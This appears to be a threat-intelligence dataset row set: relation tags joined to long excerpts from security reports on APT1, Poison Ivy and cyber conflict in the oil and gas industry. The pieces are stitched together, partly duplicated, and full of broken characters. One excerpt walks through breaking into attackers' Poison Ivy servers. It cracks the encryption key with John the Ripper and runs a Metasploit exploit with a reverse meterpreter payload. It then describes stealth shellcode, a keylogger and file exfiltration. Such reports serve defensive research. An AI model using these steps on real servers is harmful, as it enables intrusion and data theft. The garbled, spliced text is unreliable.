"RAP002_APT1_Technical_backstage.1.0","usesaddress","Poison Ivy  3.1 Description  Poison Ivy","WORK_OF_ART","6","CARDINAL","3 Poison Ivy 3.1 Description Poison Ivy is a Remote Administration Tool ( RAT ) available here : http://www.poisonivy-rat.com/index.php?link=download . This RAT is well documented on the Internet . Here is a short list of the features it provides : - File management ; - File search ; - File transfer ; - Registry management ; - Process management ; - Services management ; - Remote shell ; - Screenshot creation ; - Hash stealing ; - Audio capture ; - ÿ 3.2 Remote code execution vulnerability An exploitable vulnerability has been discovered by Andrzej Dereszowski from SIGNAL 11 . The description of the vulnerability can be found here : http://www.signal11.eu/en/research/articles/targeted_2010.pdf . This vulnerability allows the remote execution of arbitrary code on the command & control server . Metasploit framework provides an exploit to use this vulnerability . The code is available here : http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/exploits/windows/misc/poisonivy_bof.rb . This exploit did not work in our context . The exploit has two possible exploitations : - by using the default password : admin - by using brute force As the two methods did not work ; we created a third one . This method consists of finding the real password used for the encryption . Our homemade exploit with an option for the password is available in Appendix . For information , an additional Ruby package is needed to use the camellia cipher . The package can be installed using the gem command : root@alien : # gem install camellia - rb The next step was to find the password used to encrypt the communication . 3.3 Encryption key brute forcing The RAT uses a key to encrypt the communication . The password is set by the administrator and its default value is ¡ ° admin¡±. After a quick search on the Internet , we know that Poison Ivy uses Camellia as encryption algorithm . The encryption is made with 16 bytes blocks . So we decided to choose the following approach : - Send 100 bytes ( with 0x00 ) to the daemon ( same than in our scanner ) - Get the first 16 bytes as result from the server Here is the formula of the result : Result = Camellia(16 * 0x00 , key ) The result is not a printable value . Thus , we decided to make a base64 of this value and add the flag $ camellia$ to identify the algorithm . Here is an example of result : $ camellia$ItGoyeyQIvPjT / qBoDKQZg== To get the key , we developed a ¡ ° John the Ripper¡± extension . ¡ ° John the Ripper¡± is an open source password cracker . The source code can be downloaded here : http://www.openwall.com/john/. OpenSSL provides the camellia algorithm . The code source of the ¡ ° John the Ripper¡± plugin to crack camellia hashes by using the OpenSSL library is available in the appendix . After compiling ¡ ° John the Ripper¡± , a new format is available : camellia . Here is an example of a brute force session : rootbsd@alien:~/john-1.7.9 - jumbo-7 / run$ cat test.txt $ camellia$ItGoyeyQIvPjT / qBoDKQZg== rootbsd@alien:~/john-1.7.9 - jumbo-7 / run$ ./john --format = camellia test.txt Loaded 1 password hash ( Camellia bruteforce [ 32/32 ] ) No password hashes left to crack ( see FAQ ) rootbsd@alien:~/john-1.7.9 - jumbo-7 / run$ ./john --show test.txt ? : pswpsw 1 password hash cracked , 0 left The key is ¡ ° pswpsw¡±. This key must be used in our homemade Metasploit exploit . 3.4 Exploitation With the information we previously described , we were able to get access to the attackers servers . msf exploit(poisonivy_bof_v2 ) > show options Module options ( exploit / windows / misc / poisonivy_bof_v2 ): Name Current Setting Required Description ---- --------------- -------- ----------- Password pswpsw yes Client password RANDHEADER false yes Send random bytes as the header RHOST X.X.X.X yes The target address RPORT 80 yes The target port Payload options ( windows / meterpreter / reverse_https ): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit : seh , thread , process , none LHOST my_server yes The local listener hostname LPORT 8443 yes The local listener port Exploit target : I d Name -- ---- 0 Poison Ivy 2.3.2 / Windows XP SP3 / Windows 7 SP1 msf exploit(poisonivy_bof_v2 ) > exploit [ * ] Started HTTPS reverse handler on https://my_server:8443/ [ * ] Meterpreter session 1 opened ( my_server:8443 - > Y.Y.Y.Y:3325 ) at 2013 - 03 - 07 07:51:57 +0100 meterpreter > ipconfig Interface 1 = = = = = = = = = = = = Name : MS TCP Loopback interface Hardware MAC : 00:00:00:00:00:00 MTU : 1520 IPv4 Address : 127.0.0.1 IPv4 Netmask : 255.0.0.0 Interface 2 = = = = = = = = = = = = Name : AMD PCNET Family PCI Ethernet Adapter - .................

We attacked a server with the IP X.X.X.X ( identified during the scan ) and the meterpreter endpoint IP address was Y.Y.Y.Y. We concluded that the Poison Ivy daemon was hidden behind a proxy server , by using port forwarding to hide the real IP of the command & control server . We could also identify that the vendor ID of the MAC address is VMWare .

Using the netstat command they were able to detect our connection . Basically , the Poison Ivy server only had connections originating from the proxy server and no connection from any other IP . In order to stay stealth we had to connect to the Poison Ivy server through the proxy server . To establish this connection we decided to create our own shellcode . The principle of our shellcode is as follows : - Once injected in a process , the shellcode looks for open sockets ; - Once a opened socket is detected , this socket is closed ; - After , the shellcode binds itself on the previous open port ; - From now on , we are going to use the same technique than the one used in meterpreter ( bind_tcp ) . Our shellcode goal is to close the Poison Ivy daemon¡¯s socket and then open our own socket on the same port . Once our socket is opened we can use the proxy chains provided by the attackers to connect to the Poison Ivy server . In this case , when attackers checked the opened connections using netstat they could not identify our connection since it appeared to be originating from an infected targetÿ The source code of the shellcode can be found in appendix . 4 Information obtained on the C&C 4.1 Infrastructure schema Our investigation allowed us to draw a network schema of the attackers¡¯ infrastructure . Figure 2 : Network schema The infected machines communicate with the proxy through the Internet . The proxy server will forward the network packets to the Poison Ivy server . The proxy feature is done by an executable called xport.exe . This executable can encode network traffic using a xor operation . This feature requires having the executable running on both machines : the proxy and the Poison Ivy server . The syntax on the proxy server is : xport.exe Proxy_ip proxy_port Poison_Ivy_ip Poison_Ivy_port number The argument number can either be set to 1 or 2 and represents the two different encoding keys . The syntax on the Poison Ivy server is : xport.exe Poison_Ivy_ip Poison_Ivy_port localhost Poison_Ivy_daemon_port number The Poison Ivy server is managed by the attackers through a VMWare remote desktop , so that we were not able to get the real IP address of the attacker . During our investigation , we identified an established Remote Desktop Protocol ( RDP ) connection between the Poison Ivy server and the proxy server . We decided to install a key - logger on the Poison Ivy server that allowed us to see credentials to remotely connect to the proxy server . Since the attackers use RDP to manage the proxy server and that we had access , we copied the Windows event logs . Those logs contained all IPs which established a successful RDP authentication . We identified more than 350 unique IPs : rootbsd@alien:~/APT1 $ cat list_ip.txt | sort .u | wc -l 384 We suppose that this list also contains Poison Ivy servers IPs and maybe IPs of attackers who inadvertently connect directly to the proxy ) . Here is the screenshot of the proxy RDP authentication : Figure 3 : Proxy server login window Here is the screenshot of the Poison Ivy interface : Figure 4 : Poison Ivy interface with the list of connected machines Here is the screenshot of an attacker using a remote shell to an infected target : Figure 5 : Poison Ivy interface with a shell Using those accesses , we managed to exfiltrate a massive amount of files , event logs , netstat outputsÿ The interesting information can be divided in two categories : - Information about the tools used by the attackers ; - Information about the targets . 4.2 Tools The following table provides an overview on the discovered tools .

In addition , we found a directory with the official SecureCrt , which is an SSH client . We also found the SysInternals suite from Microsoft . 4.3 Targets The attackers seem to use a dedicated proxy and Poison Ivy server combination for each target . When a target discovers the IP address of a proxy , this address is reassigned to another target . That¡¯s why it is primordial to share the C&C servers IPs with our partners . The targets were private and public companies , political institutions , activists , associations or reporters . On the Poison Ivy server , a directory is created for every target . Within this directory , a directory for each infected machine was created . The naming convention for those directories is HOSTNAME^USERNAME . Here is an example : E:\companyABCD\alien^rootbsd\ In those directories files are not sorted in any specific manner . The documents types are : - .PPT - .XLS - .DOC - .PDF - .JPG Among those documents , we found : - Network diagrams ; - Internal IP / user / password combination ( local administrator , domain administrator , root , web , webcamÿ ) ; - Map of the building with digital code to open doors ; - Security incident listings ; - Security policies ; - ÿ The sensitive documents were password protected . The passwords pattern is [ a - z]{3,4}[0 - 9]{3,4 } , so it was easy to brute force them in reasonable time . Here is an example of a network diagram .

"2013-9","hasattacktime","Clausewitz","PERSON","weekdays","DATE","While these incidents do not qualify as warfare by the Clausewitz definition , they are a form of conflict . Cyber Espionage : There is significant evidence of protracted , insidious espionage carried out by a state actor within the cyber realm . China has likely launch hundreds of cyber attacks against the oil and gas industry since as early as 2002 . With the advent of Red October , they may not be the only actors in the game . With a level of sophistication not yet observed publicly in this realm , Red October could represent an evolution to China¡¯s current techniques , or another actor entering the game . By looking at some of the technical aspects of the events , a link was established between Byzantine Candor and APT1 , as well as a possible link between the Mirage Campaign and Elderwood Proj.ect . Sabotage : The Middle East has scene perhaps the most evidence and variety of cyber conflict of all . While staying away from events which do not directly relate to the oil industry , a series of sabotage incidents using cyber as the medium are examined . It is possible that there events were salvos between nation states in an example of bidirectional conflict . If this is not the case , and incidents like Shamoon were simply the act of non - state actors , then it represents affirmation of the revelence of non - state actors in future cyber conflict . This is only logical since most of America¡¯s critical infrastructure is controlled by the private sector , and economic influence can be leveraged to gain great power . Incidental : By taking an adversarial look at the Deepwater Horizon oil spill , an example of how a state actor could act in a violent , kinetic way against a non - state through cyber while remaining anonymous is examined through a vignette . It is determined that while the Deepwater horizon spill was not an attack , it easily could have been . This type of conflict is both deadly and catastrophic , and while it is unlikely to be used lightly , it sets the tone for possibilities going forward . Conclusions : Based on the observed events , the possible threat actors , and the correlation of these events , it appears that there is ongoing cyber conflict within the oil industry . The correlation of several incidents has shown coordinated attacks by an advanced foreign threat actor against multiple entities with the use of espionage . It has also suggested the pos.sibility of more destructive attacks , and pointed out the benefits to both state actors and non - state actors within the oil industry . In some cases there has been an obvious alignment of political , strategic , operational , and tactical goals and principals to affect favorable outcomes . The culmination of these findings is that there are many threat actors who are currently engaged in , or may be engaged in , ongoing conflict which may have the potential to escalate . This should be both a primary concern and a cause for future research and analysis . Introduction Recent events of national significance within the oil & gas Industry have brought to light both the question of defining threat sources and that of plausibly attributing known events to a threat source . The unprecedented rise in cy.ber events begets the question of whether this is incidental to the continued advancement of technology , or suggests an ongoing conflict that may escalate . This report will aggregate relevant events , present criteria for outlining threat origins , and determine the likelihood that the incidents are related . It also seeks to determine whether or not any observed cor.relation points to a persistent aggressor or simply circumstantial coincidence . The purpose of this analysis is to provide decision - makers with a clearer idea of the current security outlook for the oil and gas industry , and pinpoint what current and future causes for concern appear to be . All events and presented options should be considered cautiously and as empirically as possible ; any assumptions that are made will be explicitly stated . Timeline of Events One of the first priorities is to outline a timeline of events which have occurred and then examine what signifi.cance they may have or relationships they may share in order to scope the conversation . These events will constitute the frame for the analysis . Events were chosen after a preliminary overview of content from open sources such as established news media sites , oil & gas company websites , Google query results , government bulletins , and technical reports by security companies . From this brief overview , events within the Oil and Gas Industry which exhibited a ¡ ° cyber¡± component were selected . These events are not meant to be all inclusive , and due to the entirely open source nature of the resources , the vantage point on the information may be biased and in many instances is likely incomplete . However even an incomplete view may contain enough information to identify significant patterns , and by acknowledging the quality concerns with the information , a more accurate and objective analysis may be performed . Below is a timeline of observed events which will be discussed in greater detail . The timeline will list the event and the apparent target of the event . Given this data set , a natural escalation of events appears to occur , with the frequency of incidents continuing to rise . This can partially be explained by a growing international awareness of the vulnerabilities and perils involved in internet - facing control systems of all kinds ; as events occur , they garner additional attention and therefore induce ad.ditional incidents . However , there are other interesting observations to be made from this data . Largely , the incidents of great note have occurred in either North America or the Middle East . When considering that three of the top five oil producing countries are in these regions ( Saudi Arabia , the United States , and Iran ) , this is not surprising . Yet substantive reports of similar incidents are markedly absent in the other two of the top five oil producing countries ( China and Russia ) , and this is noteworthy . The argument could be made that this is due to language barriers and tight control on information dissemination , but it is improbable that a significant incident would have gone entirely unnoticed by all media outlets . As the incidents themselves make apparent , human threat actors are involved , and what remains to be identified is whether there is the complexity , overarching coordination , or recurring threat source that would point to an advanced threat such as a state actor or complex non - state actor . Before continuing with the possible attribution of events , some base discussion and criteria for the threat sourc.es must be established . A threat source is considered to be a human - based or natural entity which possesses a capabil.ity that aligns with an unmitigated vulnerability . The threat sources which will be considered must meet the minimum requirement of having both the motive and the means to carry out the attack . Once a hypothesis consisting of these ele.ments is established , it will be scrutinized to determine whether or not the events surrounding the incident or series of incidents align in any obvious political , strategic , operational and tactical manner . The means in this case consists of both the opportunity and the technological capability to cause the incident to occur , and the motives that will be considered are economic gain , retribution , or political agenda ( to include ideology ) . The US Army notes in their Cyber Concept & Capabilities plan for 2016 - 2028 that cyber capabilities pose a unique and attractive opportunity to an inferior , asymmetric enemy to temporarily gain equivalence with a superior en.emy because of its relatively low initial cost , high return on investment , and plausible deniability due to issues with attri.bution . Because of this fact , it is highly likely that multiple foreign agencies as well as powerful corporate denizens have used and continue to make use of cyber capabilities to affect favorable outcomes . The rest of the report will attempt to substantiate this claim through critical analysis . Methods To reach the conclusions presented in the ensuing report incidents were collected and chosen based on the inclusion of cyber either as the medium for the event , or as some component factor that played a direct or otherwise instrumental role in the outcome . After collecting a sampling of incidents into a dataset , these incidents were examined and several directly attributable features / impacts were taken into account , including : . The victim(s ) targeted . Evidence of cyber involvement . Economic losses . Fatalities incurred . Geopolitical impacts Beyond the direct impacts , it was also necessary to consider possible indirect ¡ ° ripple¡± effects . For example , it could be important to consider something like the prices of crude oil prior to and after a given incident . A circumstance may be such that particular companies or countries unaffected by the incident would find themselves benefiting from a ripple effect like higher crude prices . Other effects to identify include changes in the status of the involved companies through.out an incident . This could involve looking at earnings reports , the selling or buying of assets , or any legal actions the company is involved in , as well as contextual events that are significant or contentious and occur directly prior to or after an incident . Through the investigation of these outcomes and contexts , there is the possibility of finding correlations be.tween various incidents . These correlations may be made plain by observable patterns among the details of the events . An observed pattern may suggest a recurring actor¡ªthese patterns include tactical and methodical similarities between alleged attacks , recurring targets , entities that directly or indirectly benefitted or incurred losses as an outcome , and geo.graphic dispersion or closeness of the events . In cases where an attack is apparent , tactical elements such as tools were scrutinized as well , as a means of attribution . For example , a tool may unintentionally exhibit cultural tendencies such as the language used , colloquialisms , idioms , religious preference , and recurring personal habits of the creator or operator . These signatures coupled with aspects of the tactical assets like exclusiveness ( as in the case of a purchased domain used as a C2 point ) can significantly raise the confidence level of an attribution . Possible actors in the cyber exchange can ostensibly be identified from these correlations . If it is determined that the incident was an attack , motives of the potential actors can be considered . A key element of this that should be considered is any precedence for the attack . The history of political relationships between countries , such as any ex.pressed hostilities or allegiances and treaties , may also prove relevant . History also tells us that most conflicts arise over the acquisition of resources . As such , the energy resources and requirements of nation - states must be analyzed . For ex.ample , is the entity being examined a major importer or exporter of oil ? Is the entity capable of energy self - sufficiency ? Or has the country been experiencing a major influx in energy demand ? This information can then be aggregated and synthesized into a more informed view of the event . A final major component of the analysis was the examination of whether the motives and methods align with the actor¡¯s strategic culture . This includes defining the overall strategic theories that the country adheres to and goals it desires to accomplish . As mentioned earlier , the tactics employed during the attack can be incredibly potent as an attri.bution mechanism¡ªif an attack is far removed from a nation¡¯s capabilities , it is less likely that they were involved in the incident . Likewise , if the tactics are within a given nation¡¯s technical prowess and follow established patterns exhibited by that nation , it significantly improves the confidence in attribution . However , caution was taken when attributing tactics to actors , as deception is a common element in many cyber warfare strategies . Therefore , tactical similarities or dissimilari.ties alone do not implicitly identify or rule out a given actor . Biases The nature of OSINT gathering poses obstacles to objective analysis . While gathering the data , it should be noted that there are source biases . All of the sources used are open source , and as such the provenance of the informa.tion can not always be independently verified . The information itself may be legitimate , but presented in an incomplete or skewed manner . It is also likely that not all of the details of the collected incidents are available . In some cases the companies reporting the incidents , such as Symantec and MacAfee , are not legally disposed to divulge select information about their customers . Another limitation is information available about incidents that occurred in foreign countries . Due to tighter control over journalism or language barriers , other countries are likely not releasing full details from inci.dents that have occurred or not doing so in languages familiar to the authors . In some cases , entire events may not be released to the public , either by foreign governments or the companies themselves . In order to address the above concerns , several methods were used . Data was gathered from established , and ideally trustworthy , sources . This includes reports from reputable news sites , company or government publications , or scholarly papers . Also , every effort was made to track down the original source of the information found in reports , or cross - examine it with other sources . Multiple sources were found wherever possible and scrutinized in order to obtain corroborating data . Of equal interest is information which was contradictory between sources . These contradictions were presented and addressed where appropriate . Finally , despite evidence found in support of any given actor , alternate hypotheses must be considered . As with any intelligence gathering , there is the possibility of error , whether information is misreported or taken out of context , and this is especially true of OSINT . The purpose was not to select an outcome and attempt to support it but rather to find refutation as well . Information that may exculpate a particular actor was thoroughly considered . Although human error is common in cyber incidents , it is important to determine whether the error was taken advantage of by others . Cyber Espionage One of the most easily distinguishable patterns on the above timeline is the growing frequency of reported cyber espionage . This saga of long - term campaigns has been garnering a lot of attention , and with good reason . Some have asserted that certain campaigns have existed since the early 2000¡¯s1 , yet their existence has only recently come to light in the private sector . The damage caused by these types of breaches is difficult to estimate because it occurred over such a long time span , but in some cases terabytes of data were stolen over the period of a few months.2 When taken in relation to the oil industry , where proprietary information like bid exploration data is the lifeblood of the organization , this can be a disastrous blow . However , while campaigns like ¡ ° Night Dragon¡± are pointedly targeted at the oil industry , others are far more encompassing in their breadth and appear more disparate . Establishing a baseline or pattern within this industry alone excludes a large and potentially useful amount of context . Not only were most of these cyber espionage campaigns larger in scope than simply the oil and gas industry , but some also completely excluded it . Interestingly , there are other cyber espionage campaigns not listed in the timeline ( such as the infamous Flame and Mahdi viruses ) that target countries with some of the largest oil reserves in the world , but the attacks themselves were not targeted at the Oil & Gas Industries . Given the sheer number of incidents , it would seem likely that there is more than one source , yet the technical data available seems to suggest otherwise . It is clear that these incidents represent a huge danger to the profitability and competitiveness , even the future success , of victim companies ; Yet these consequences carry with them some level of inherent attribution . The very nature of proprietary information means that if an entity who had acquired it were to use the information , it could identify them as having a connection to the incident , whether directly or through a third party . Also , attacks of this scale require some level of organization that manifests itself in the form of repeated patterns of be.havior and resource usage that can suggest a common origin . This organization coupled with the resources and expertise necessary to process and analyze the exorbitant volume of stolen information leads to a high likelihood of state actor or organized criminal involvement . One of the largest difficulties present in identifying the provenance and totality of these attacks is that there is no publicly available aggregation of the body of information collected on the various APT activities . Instead , Antivirus & Incident Response firms which have the best vantage point on the situation are providing separate reports in which they use their own colloquial names and terms for the attacks , the tools , and the campaigns . This creates overlap , where campaigns with different names may in fact be part of the same campaign , and the technical data that is otherwise separated across the reports could together represent a more apparent pattern . Only one report , the Mandiant APT1 report , included a brief table noting that they had compared some of the other attacks and ruled out APT1 as the culprit . Additionally , these firms are entrusted with the safeguard of their customers¡¯ information , and so often will not release the full extent of what was found , nor a definitive list of victims . adding to the obscurity . These sources also introduce their own biases which must be accounted for . For this reason , what follows is an overview of the various reports that mention the oil and gas industry as targets , and an analysis of important technical aspects and goals of these campaigns . Through this analysis , hopefully a more complete view of the action may be obtained to see if the goals , resources , techniques , and timeframes exhibit commonality between attacks . 1 Mandiant , APT1 ( Feb 13 , 2013 ) . Retrieved from http://www.mandiant.com/apt1 2 Ibid . Oil / Gas Inclusive or Specific Campaigns ¡ ® Countries affect¡¯ lists only countries where oil and gas companies were compromised . Campaign : NightDragon Publisher : McAfee Synopsis : The NightDragon report released by McAfee was somewhat of a seminal event in that it was the first well known release of a fairly detailed APT analysis and technical attribu.tion . The attacks conglomerated in NightDragon were nearly all conducted against unspecified ¡ ° global oil , energy , and petrochemical companies.¡± The attacks followed a methodical series of steps : 1 . using SQL - injection to obtain access to an extranet server , or using spear - phishing against ¡ ° mobile worker laptops¡± and ¡ ° compromising corporate VPN accounts¡± to ob.tain access to the company intranet 2 . uploading common hash dumping tools & password cracking tools harvest Active Directory credentials to gain access to sensitive desktops & servers 3 . Access sensitive documents 4 . Upload RAT malware to exfiltrate sensitive data 5 . Move laterally McAfee was also able to identify much of the generic malware used , and communications techniques . They also suggested that the attackers worked between 9:00am and 5:00pm Bei.jing time during weekdays , and that most traffic was originating from the Shandong Province of China . "

We attacked a server with the IP X.X.X.X ( identified during the scan ) and the meterpreter endpoint IP address was Y.Y.Y.Y. We concluded that the Poison Ivy daemon was hidden behind a proxy server , by using port forwarding to hide the real IP of the command & control server .

Using the netstat command they were able to detect our connection . Basically , the Poison Ivy server only had connections originating from the proxy server and no connection from any other IP . In order to stay stealth we had to connect to the Poison Ivy server through the proxy server . To establish this connection we decided to create our own shellcode . The principle of our shellcode is as follows : - Once injected in a process , the shellcode looks for open sockets ; - Once a opened socket is detected , this socket is closed ; - After , the shellcode binds itself on the previous open port ; - From now on , we are going to use the same technique than the one used in meterpreter ( bind_tcp ) . Our shellcode goal is to close the Poison Ivy daemon¡¯s socket and then open our own socket on the same port . Once our socket is opened we can use the proxy chains provided by the attackers to connect to the Poison Ivy server . In this case , when attackers checked the opened connections using netstat they could not identify our connection since it appeared to be originating from an infected targetÿ The source code of the shellcode can be found in appendix . 4 Information obtained on the C&C 4.1 Infrastructure schema Our investigation allowed us to draw a network schema of the attackers¡¯ infrastructure . Figure 2 : Network schema The infected machines communicate with the proxy through the Internet . The proxy server will forward the network packets to the Poison Ivy server . The proxy feature is done by an executable called xport.exe . This executable can encode network traffic using a xor operation . This feature requires having the executable running on both machines : the proxy and the Poison Ivy server . The syntax on the proxy server is : xport.exe Proxy_ip proxy_port Poison_Ivy_ip Poison_Ivy_port number The argument number can either be set to 1 or 2 and represents the two different encoding keys . The syntax on the Poison Ivy server is : xport.exe Poison_Ivy_ip Poison_Ivy_port localhost Poison_Ivy_daemon_port number The Poison Ivy server is managed by the attackers through a VMWare remote desktop , so that we were not able to get the real IP address of the attacker . During our investigation , we identified an established Remote Desktop Protocol ( RDP ) connection between the Poison Ivy server and the proxy server . We decided to install a key - logger on the Poison Ivy server that allowed us to see credentials to remotely connect to the proxy server . Since the attackers use RDP to manage the proxy server and that we had access , we copied the Windows event logs . Those logs contained all IPs which established a successful RDP authentication . We identified more than 350 unique IPs : rootbsd@alien:~/APT1 $ cat list_ip.txt | sort .u | wc -l 384 We suppose that this list also contains Poison Ivy servers IPs and maybe IPs of attackers who inadvertently connect directly to the proxy ) . Here is the screenshot of the proxy RDP authentication : Figure 3 : Proxy server login window Here is the screenshot of the Poison Ivy interface : Figure 4 : Poison Ivy interface with the list of connected machines Here is the screenshot of an attacker using a remote shell to an infected target : Figure 5 : Poison Ivy interface with a shell Using those accesses , we managed to exfiltrate a massive amount of files , event logs , netstat outputsÿ The interesting information can be divided in two categories : - Information about the tools used by the attackers ; - Information about the targets . 4.2 Tools The following table provides an overview on the discovered tools .

In addition , we found a directory with the official SecureCrt , which is an SSH client . We also found the SysInternals suite from Microsoft . 4.3 Targets The attackers seem to use a dedicated proxy and Poison Ivy server combination for each target . When a target discovers the IP address of a proxy , this address is reassigned to another target . That¡¯s why it is primordial to share the C&C servers IPs with our partners . The targets were private and public companies , political institutions , activists , associations or reporters . On the Poison Ivy server , a directory is created for every target .

As a result of their success , many other strategic compromises have been adopted by other attack groups , as seen in a notable attack targeting iOS developers earlier in 2013 which impacted employees at Facebook , Apple and Twitter . In the VOHO campaign , ten legitimate websites were strategically compromised . The attackers carefully selected these websites based on the likelihood that the intended target(s ) would visit them during the exploit delivery phase . The attackers likely pre - determined who visited the watering - hole in advance of the distribution phase of attack . This could easily be achieved by examining the access logs of compromised Web servers . The categories of websites compromised were both regional and industry - specific in nature and targeted the following key areas illustrated in Figure 5 . Timeline of activity The VOHO watering - hole distributed remote access Trojans in two phases . In phase one of the attack , an Internet Explorer zero - day vulnerability , the Microsoft XML Core Services CVE-2012 - 1889 Remote Code Execution Vulnerability ( CVE-2012 - 1889 ) , was leveraged .
